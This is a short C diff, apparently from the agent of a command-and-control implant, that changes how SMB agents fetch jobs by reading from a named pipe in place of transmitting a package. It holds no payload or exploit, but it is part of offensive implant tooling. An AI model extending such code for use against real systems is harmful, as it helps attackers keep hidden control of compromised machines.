@@ -91,8 +91,8 @@ VOID CommandDispatcher( VOID )
 
 /* SMB */
 #else
-        // if an SMB agent can't communicate, don't die
-        if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) )
+        // SMB agents simply try to read from their Pipe
+        if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) )
             continue;
 #endif
 
